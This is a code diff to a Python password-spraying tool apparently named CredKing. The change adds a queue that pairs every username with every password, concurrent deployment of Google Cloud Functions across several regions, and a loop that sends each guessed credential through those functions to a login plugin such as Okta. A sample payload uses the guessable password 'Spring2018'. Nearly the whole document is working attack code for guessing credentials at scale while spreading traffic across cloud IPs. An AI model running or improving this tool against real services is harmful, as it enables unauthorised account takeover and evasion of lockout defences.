@@ -5,6 +5,7 @@ from googleapiclient.discovery import build
 from google.oauth2 import service_account
 from google.cloud import storage
 from time import time
+from concurrent.futures import ThreadPoolExecutor
 from pprint import pprint
 from threading import Lock, Thread
 lock = Lock()
@@ -13,6 +14,9 @@ import re, argparse, importlib
 # TODO: Pass in service account file as an argument
 _service_account_email = ""
 credentials = {'accounts': []}
+
+lock = Lock()
+q = queue.Queue()
 
 def main(args,pargs):
     global start_time, end_time, time_lapse
@@ -32,6 +36,9 @@ def main(args,pargs):
     start_time = datetime.datetime.utcnow()
     log_entry('Execution started at: {}'.format(start_time))
 
+    # Prepare credential combinations into the queue
+    load_credentials(username_file, password_file, useragent_file)
+
     # Check with plugin to make sure it has the data that it needs
     validator = importlib.import_module('plugins.{}'.format(plugin))
     if getattr(validator, "validate", None) is not None:
@@ -44,27 +51,30 @@ def main(args,pargs):
 
 
     #sa_file = 'service-account.json'
-    credentials = service_account.Credentials.from_service_account_file(sa_file)
-    _service_account_email = credentials.service_account_email
+    sa_credentials = service_account.Credentials.from_service_account_file(sa_file)
+    _service_account_email = sa_credentials.service_account_email
 
-    service = build('cloudfunctions', 'v1', credentials=credentials)
-    storage_service = build('storage', 'v1', credentials=credentials)
+    service = build('cloudfunctions', 'v1', credentials=sa_credentials)
+    storage_service = build('storage', 'v1', credentials=sa_credentials)
 
     # Uploading Code
 
     # Creating a bucket
     bucket_name = f"credking_{next(generate_random())}"
     body = {'name': bucket_name}
-    log_entry(storage_service.buckets().insert(project=credentials.project_id, predefinedAcl="projectPrivate",
+    log_entry(storage_service.buckets().insert(project=sa_credentials.project_id, predefinedAcl="projectPrivate",
                                                body=body).execute())
 
     # Uploading a file from a created bucket
-    storage_client = storage.Client(project=credentials.project_id, credentials=credentials)
+    storage_client = storage.Client(project=sa_credentials.project_id, credentials=sa_credentials)
     bucket = storage_client.bucket(bucket_name)
     source_url = create_bucket(bucket,'okta')
 
     locations = service.projects().locations()
-    functions = create_functions(locations,credentials.project_id,source_url,thread_count)
+    functions = create_functions(sa_credentials,locations,sa_credentials.project_id,source_url,thread_count)
+
+    for x in functions:
+        check_function(locations.functions(),x)
 
     # Call Function
     data = {"username": "test.test2", "password": "Spring2018", "useragent": "test",
@@ -72,29 +82,99 @@ def main(args,pargs):
     body = {"data": json.dumps(data)}
     # log_entry(service.projects().locations().functions().call(name=function_name,body=body).execute())
     for function_name in functions:
-        invoke_function(locations.functions(), function_name, body)
+        #invoke_function(locations.functions(), function_name, body)
+        start_spray(locations.functions(),function_name,pluginargs)
         delete_function(locations.functions(), function_name)
     delete_bucket(bucket)
     delete_zip()
 
-def create_functions(locations,project_id,source_url,thread_count):
+def start_spray(function,function_name,args):
+    while True:
+        item = q.get_nowait()
+
+        if item is None:
+            break
+
+        payload = {}
+        payload['username'] = item['username']
+        payload['password'] = item['password']
+        payload['useragent'] = item['useragent']
+        payload['args'] = args
+        body = {"data": json.dumps(payload)}
+
+        invoke_function(function,function_name,body)
+
+        q.task_done()
+
+def load_credentials(user_file, password_file,useragent_file=None):
+	log_entry('Loading credentials from {} and {}'.format(user_file, password_file))
+
+	users = load_file(user_file)
+	passwords = load_file(password_file)
+	if useragent_file is not None:
+		useragents = load_file(useragent_file)
+	else:
+		useragents = ["Python CredKing (https://github.com/ustayready/CredKing)"]
+
+	for user in users:
+		for password in passwords:
+			cred = {}
+			cred['username'] = user
+			cred['password'] = password
+			cred['useragent'] = random.choice(useragents)
+			credentials['accounts'].append(cred)
+
+	for cred in credentials['accounts']:
+		q.put(cred)
+
+def load_file(filename):
+	if filename:
+		return [line.strip() for line in open(filename, 'r')]
+
+def create_functions(sa_credentials,locations,project_id,source_url,thread_count):
     # Get Locations
     locations_response = locations.list(name=f'projects/{project_id}').execute()
     location_names = ["us-central1","us-east1","us-east4","europe-west1","asia-east2"]
     #log_entry(len(locations_response['locations']))
     log_entry(len(location_names))
     # print(json.dumps(locations,indent=2))
+    threads = thread_count
 
     if thread_count > len(location_names):
-        thread_count = len(location_names)
-    #elif thread_count > len(credentials['accounts']):
-    #    thread_count = len(credentials['accounts'])
-
-    function = locations.functions()
+        threads = len(location_names)
+    elif thread_count > len(credentials['accounts']):
+        threads = len(credentials['accounts'])
+    log_entry(f"Number of functions to be created: {threads}")
     function_names = []
-    for x in range(0,thread_count):
-        function_names.append(create_function(function, project_id, source_url, location_names[x]))
-    return function_names
+    function = locations.functions()
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        for x in range(0,threads):
+            function_names.append(
+                executor.submit(
+                    create_function,
+                    sa_credentials=sa_credentials,
+                    function=locations.functions(),
+                    project_id=project_id,
+                    source_url=source_url,
+                    location=location_names[x]
+                )
+            )
+    for x in function_names:
+        print(x.result())
+    return [x.result() for x in function_names]
+
+
+def check_function(function, function_name):
+    # Get Status of the function and make sure that it is active
+    while True:
+        sleep = 5
+        status = function.get(name=function_name).execute()
+        if status['status'] == 'ACTIVE':
+            break
+        else:
+            log_entry(f"Waiting {sleep} seconds for function to become ACTIVE")
+            time.sleep(sleep)
+    log_entry(f"Created Function: {function_name}")
 
 
 def log_entry(entry):
@@ -126,7 +206,8 @@ def create_bucket(bucket,plugin):
     object_url = f'gs://{blob.bucket.name}/{blob.name}'
     return object_url
 
-def create_function(function, project_id, source_url,location):
+def create_function(sa_credentials, function, project_id, source_url,location):
+    service = build('cloudfunctions', 'v1', credentials=sa_credentials)
     # Calling the create function command
     log_entry(location)
     f_name = f'credking-function-{next(generate_random())}'
@@ -151,21 +232,10 @@ def create_function(function, project_id, source_url,location):
             "vpcConnector": "",
             "serviceAccountEmail": _service_account_email
             }
-    #function = service.projects().locations().functions()
-    function_resp = function.create(location=location_name,body=body).execute()
+    function2 = service.projects().locations().functions()
+    function_resp = function2.create(location=location_name,body=body).execute()
     log_entry(f"Function Resp: {function_resp}")
 
-    # TODO: Move the check out of this when threading
-    # Get Status of the function and make sure that it is active
-    while True:
-        sleep = 5
-        status = function.get(name=function_name).execute()
-        if status['status'] == 'ACTIVE':
-            break
-        else:
-            log_entry(f"Waiting {sleep} seconds for function to become ACTIVE")
-            time.sleep(sleep)
-    log_entry(f"Created Function: {function_name}")
     return function_name
 
 def invoke_function(function,function_name,payload):
